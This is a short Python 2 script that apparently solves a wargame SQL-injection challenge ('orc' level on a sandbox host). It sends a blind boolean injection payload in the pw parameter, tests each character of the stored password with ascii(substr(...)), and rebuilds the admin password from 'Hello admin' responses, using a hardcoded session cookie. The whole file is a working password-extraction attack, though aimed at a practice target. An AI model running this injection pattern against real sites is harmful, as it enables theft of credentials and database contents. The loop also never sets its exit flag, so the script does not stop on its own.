import requests
cookie = dict(PHPSESSID="rm6fnad7iebmeivi28gsi2nqv1")

#table = list(map(chr, range(ord('A'), ord('z')+1)))
table = [str(i) for i in range(90,0xff)]
i = 1
password = ""
k = 1
while k:
	for j in range(0,len(table)):	
		url = "http://los.sandbox.cash/chall/orc_c6199859b81e3a30d63d948875f6a3dd.php?pw=' or ascii(substr(pw,"+str(i)+",1))='"+table[j]+"'--%20" 
		r = requests.post(url,cookies=cookie)
		r = r.text
		if r.find('<hr><br><h2>Hello admin</h2><code>')>0:
			password += chr(int(table[j]))
			print password
			i += 1
			break
	print "--"
